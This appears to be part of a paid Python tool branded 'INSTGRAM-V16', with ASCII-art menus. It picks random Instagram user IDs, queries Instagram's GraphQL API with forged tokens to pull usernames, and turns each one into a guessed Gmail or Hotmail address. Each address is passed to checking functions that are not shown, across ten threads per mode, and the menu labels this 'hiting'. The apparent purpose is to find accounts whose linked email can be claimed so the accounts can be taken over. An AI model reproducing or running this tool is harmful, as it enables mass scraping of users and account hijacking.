def gm_2011():
    bbk = 10000
    id = 17699999
    while True:
        data = {
            "lsd": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            "variables": json.dumps({"id": int(random.randrange(bbk, id)), "render_surface": "PROFILE"}),
            "doc_id": "25618261841150840"
        }

        try:
            response = requests.post(
                "https://www.instagram.com/api/graphql",
                headers={"X-FB-LSD": data["lsd"]},
                data=data
        )
        except:pass
        try:
         username = response.json().get('data', {}).get('user', {}).get('username')
         email=username+"@gmail.com"
         insta(email)
        except:pass
def gm_2012():
    bbk = 17699999
    id = 263014407
    while True:
        data = {
            "lsd": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            "variables": json.dumps({"id": int(random.randrange(bbk, id)), "render_surface": "PROFILE"}),
            "doc_id": "25618261841150840"
        }

        try:
            response = requests.post(
                "https://www.instagram.com/api/graphql",
                headers={"X-FB-LSD": data["lsd"]},
                data=data
        )
        except:pass
        try:
         username = response.json().get('data', {}).get('user', {}).get('username')
         email=username+"@gmail.com"
         insta(email)
        except:pass
def gm_2014_2024():
    bbk = 361365133
    id = 21254029834
    while True:
        data = {
            "lsd": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            "variables": json.dumps({"id": int(random.randrange(bbk, id)), "render_surface": "PROFILE"}),
            "doc_id": "25618261841150840"
        }
        try:
            response = requests.post(
                "https://www.instagram.com/api/graphql",
                headers={"X-FB-LSD": data["lsd"]},
                data=data
        )
        except:pass
        try:
         username = response.json().get('data', {}).get('user', {}).get('username')
         email=username+"@gmail.com"
         insta(email)
        except:pass
def gm_2013():
    bbk = 263014407
    id = 361365133
    while True:
        data = {
            "lsd": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            "variables": json.dumps({"id": int(random.randrange(bbk, id)), "render_surface": "PROFILE"}),
            "doc_id": "25618261841150840"
        }

        try:
            response = requests.post(
                "https://www.instagram.com/api/graphql",
                headers={"X-FB-LSD": data["lsd"]},
                data=data
        )
        except:pass
        try:
         username = response.json().get('data', {}).get('user', {}).get('username')
         email=username+"@gmail.com"
         insta(email)
        except:""
def hot_2011():
    bbk = 10000
    id = 17699999
    while True:
        data = {
            "lsd": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            "variables": json.dumps({"id": int(random.randrange(bbk, id)), "render_surface": "PROFILE"}),
            "doc_id": "25618261841150840"
        }

        try:
            response = requests.post(
                "https://www.instagram.com/api/graphql",
                headers={"X-FB-LSD": data["lsd"]},
                data=data
        )
        except:pass
        try:
         username = response.json().get('data', {}).get('user', {}).get('username')
         email=username+"@hotmail.com"
         insta2(email)
        except:pass
def hot_2012():
    bbk = 17699999
    id = 263014407
    while True:
        data = {
            "lsd": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            "variables": json.dumps({"id": int(random.randrange(bbk, id)), "render_surface": "PROFILE"}),
            "doc_id": "25618261841150840"
        }

        try:
            response = requests.post(
                "https://www.instagram.com/api/graphql",
                headers={"X-FB-LSD": data["lsd"]},
                data=data
        )
        except:pass
        try:
         username = response.json().get('data', {}).get('user', {}).get('username')
         email=username+"@hotmail.com"
         insta2(email)
        except:pass
def hot_2014_2024():
    bbk = 361365133
    id = 21254029834
    while True:
        data = {
            "lsd": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            "variables": json.dumps({"id": int(random.randrange(bbk, id)), "render_surface": "PROFILE"}),
            "doc_id": "25618261841150840"
        }
        try:
            response = requests.post(
                "https://www.instagram.com/api/graphql",
                headers={"X-FB-LSD": data["lsd"]},
                data=data
        )
        except:pass
        try:
         username = response.json().get('data', {}).get('user', {}).get('username')
         email=username+"@hotmail.com"
         insta2(email)
        except:pass
def hot_2013():
    bbk = 263014407
    id = 361365133
    while True:
        data = {
            "lsd": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            "variables": json.dumps({"id": int(random.randrange(bbk, id)), "render_surface": "PROFILE"}),
            "doc_id": "25618261841150840"
        }

        try:
            response = requests.post(
                "https://www.instagram.com/api/graphql",
                headers={"X-FB-LSD": data["lsd"]},
                data=data
        )
        except:pass
        try:
         username = response.json().get('data', {}).get('user', {}).get('username')
         email=username+"@hotmail.com"
         insta2(email)
        except:pass
def liist():
   kk=f'''{S}



░█████╗░██╗░░██╗███╗░░░███╗███████╗██████╗░
██╔══██╗██║░░██║████╗░████║██╔════╝██╔══██╗
███████║███████║██╔████╔██║█████╗░░██║░░██║
██╔══██║██╔══██║██║╚██╔╝██║██╔══╝░░██║░░██║
██║░░██║██║░░██║██║░╚═╝░██║███████╗██████╔╝
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚══════╝╚═════╝░

██╗░░██╗██╗░░██╗░█████╗░███╗░░██╗
██║░██╔╝██║░░██║██╔══██╗████╗░██║
█████═╝░███████║███████║██╔██╗██║
██╔═██╗░██╔══██║██╔══██║██║╚████║
██║░╚██╗██║░░██║██║░░██║██║░╚███║
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝
{HH}═════════════════════════════════════════════════════════
            {X} {S}INSTGRAM-{G}V16-{E}Paid{X}   
{HH}═════════════════════════════════════════════════════════'''
   hh= f"""{kk}
{S}══════════════════════════════════
{S}1 - {M}Check List Gmail
{S}2 - {M}Check List Hotmali
{S}00 - Back
{S}══════════════════════════════════
    """
   print(hh)
   try:
      ii=int(input("Choice What You Eante :"))
      if ii==1:
         name=input("Enter File Name :")
         os.system('cls'if os.name=='nt'else'clear')
         admin_gm(name)
      elif ii==2:
         name=input("Enter File Name :")
         os.system('cls'if os.name=='nt'else'clear')
         admin_hot(name)
      elif ii==00:
         os.system('cls'if os.name=='nt'else'clear')
         znm()
   except:print("Errur Input *")
def othher():  
   kk=f'''{S}



░█████╗░██╗░░██╗███╗░░░███╗███████╗██████╗░
██╔══██╗██║░░██║████╗░████║██╔════╝██╔══██╗
███████║███████║██╔████╔██║█████╗░░██║░░██║
██╔══██║██╔══██║██║╚██╔╝██║██╔══╝░░██║░░██║
██║░░██║██║░░██║██║░╚═╝░██║███████╗██████╔╝
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚══════╝╚═════╝░

██╗░░██╗██╗░░██╗░█████╗░███╗░░██╗
██║░██╔╝██║░░██║██╔══██╗████╗░██║
█████═╝░███████║███████║██╔██╗██║
██╔═██╗░██╔══██║██╔══██║██║╚████║
██║░╚██╗██║░░██║██║░░██║██║░╚███║
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝

{HH}═════════════════════════════════════════════════════════
            {X} {S}INSTGRAM-{G}V16-{E}Paid{X}     
{HH}═════════════════════════════════════════════════════════
 '''
   hh= f"""{kk}
{S}══════════════════════════════════
{S}1 - {M}Gmail 2011
{S}2 - {M}Gmail 2012
{S}3 - {M}Gmail 2013 
{S}4 - {M}Hotmail 2011 
{S}5 - {M}Hotmail 2012
{S}6 - {M}Hotmail 2013 
{S}00 - {M}Back
{S}══════════════════════════════════
    """
   print(hh)
   try:
      ii=int(input("Enter What You Wante : "))
      if ii==1:
         os.system('cls'if os.name=='nt'else'clear')
         from threading import Thread
         for i in range(10):
            Thread(target=gm_2011).start()
      elif ii==2:
         os.system('cls'if os.name=='nt'else'clear')
         from threading import Thread
         for i in range(10):
            Thread(target=gm_2012).start()
      elif ii==3:
         os.system('cls'if os.name=='nt'else'clear')
         from threading import Thread
         for i in range(10):
            Thread(target=gm_2013).start()
      elif ii==4:
         os.system('cls'if os.name=='nt'else'clear')
         from threading import Thread
         for i in range(10):
            Thread(target=hot_2011).start()
      elif ii==5:
         os.system('cls'if os.name=='nt'else'clear')
         from threading import Thread
         for i in range(10):
            Thread(target=hot_2012).start()
      elif ii==6:
         os.system('cls'if os.name=='nt'else'clear')
         from threading import Thread
         for i in range(10):
            Thread(target=hot_2013).start()
      elif ii==00:
         os.system('cls'if os.name=='nt'else'clear')
         znm()
      else:print('Errur Input *')
   except:print("Errur Input*")
def rrandom():
    kk=f'''{S}



░█████╗░██╗░░██╗███╗░░░███╗███████╗██████╗░
██╔══██╗██║░░██║████╗░████║██╔════╝██╔══██╗
███████║███████║██╔████╔██║█████╗░░██║░░██║
██╔══██║██╔══██║██║╚██╔╝██║██╔══╝░░██║░░██║
██║░░██║██║░░██║██║░╚═╝░██║███████╗██████╔╝
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚══════╝╚═════╝░

██╗░░██╗██╗░░██╗░█████╗░███╗░░██╗
██║░██╔╝██║░░██║██╔══██╗████╗░██║
█████═╝░███████║███████║██╔██╗██║
██╔═██╗░██╔══██║██╔══██║██║╚████║
██║░╚██╗██║░░██║██║░░██║██║░╚███║
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝

{HH}═════════════════════════════════════════════════════════
            {X}{S}INSTGRAM-{G}V16-{E}Paid{X}     
{HH}═════════════════════════════════════════════════════════'''
    hh= f"""{kk}
{S}══════════════════════════════════
{S}1 - {M}Ramdom Gmail
{S}2 - {M}Random Hotmail 
{S}00 - {M}Back
{S}══════════════════════════════════
    """
    print(hh)
    try:
       ii=int(input("Choice What You Eante :"))
       if ii==1:
         os.system('cls'if os.name=='nt'else'clear')
         from threading import Thread
         for i in range(10):
            Thread(target=gm_2014_2024).start()
       elif ii==2:
         os.system('cls'if os.name=='nt'else'clear')
         from threading import Thread
         for i in range(10):
            Thread(target=hot_2014_2024).start()
       elif ii==00:
          os.system('cls'if os.name=='nt'else'clear')
          znm()
       else:print("Errur Input *")

    except:print("Errur Input *")  
def znm():
   kk=f'''{S}



░█████╗░██╗░░██╗███╗░░░███╗███████╗██████╗░
██╔══██╗██║░░██║████╗░████║██╔════╝██╔══██╗
███████║███████║██╔████╔██║█████╗░░██║░░██║
██╔══██║██╔══██║██║╚██╔╝██║██╔══╝░░██║░░██║
██║░░██║██║░░██║██║░╚═╝░██║███████╗██████╔╝
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚══════╝╚═════╝░

██╗░░██╗██╗░░██╗░█████╗░███╗░░██╗
██║░██╔╝██║░░██║██╔══██╗████╗░██║
█████═╝░███████║███████║██╔██╗██║
██╔═██╗░██╔══██║██╔══██║██║╚████║
██║░╚██╗██║░░██║██║░░██║██║░╚███║
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝

{HH}═════════════════════════════════════════════════════════
            {X}{S}INSTGRAM-{G}V16-{E}Paid{X}     
{HH}═════════════════════════════════════════════════════════'''
   hh= f"""{kk}
{S}══════════════════════════════════
{S}1 - {M}From list Gmail & Hotmail
{S}2 - {M}Random Gmail & Hotmail
{S}3 - {M}Other Hiting
{S}══════════════════════════════════
    """
   print(hh)
   try:
       i = int(input(f'{S}Choose What You Want In Choices? : '))
       if i ==1:
          os.system('cls'if os.name=='nt'else'clear')
          liist()
       elif i==2:
          os.system('cls'if os.name=='nt'else'clear')
          rrandom()
       elif i==3:
          os.system('cls'if os.name=='nt'else'clear')
          othher()
       else:
          print("Error Input *")
   except Exception as e:
      print(e)

znm()

